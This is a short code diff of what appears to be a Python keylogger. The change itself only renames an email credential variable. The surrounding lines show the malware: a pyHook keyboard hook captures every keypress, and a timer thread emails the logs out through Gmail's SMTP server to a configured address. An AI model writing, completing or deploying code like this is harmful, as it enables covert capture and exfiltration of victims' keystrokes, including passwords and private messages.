@@ -28,7 +28,7 @@ class TimerClass(threading.Thread):
                 ts = datetime.datetime.now()
                 SERVER = "smtp.gmail.com"
                 PORT = 587
-                USER = Eem4
+                USER = EEMAIL
                 PASS = EPASS
                 FROM = USER
                 TO = [USER]
@@ -78,4 +78,3 @@ obj = pyHook.HookManager()
 obj.KeyDown = pushing
 obj.HookKeyboard()
 pythoncom.PumpMessages()
-
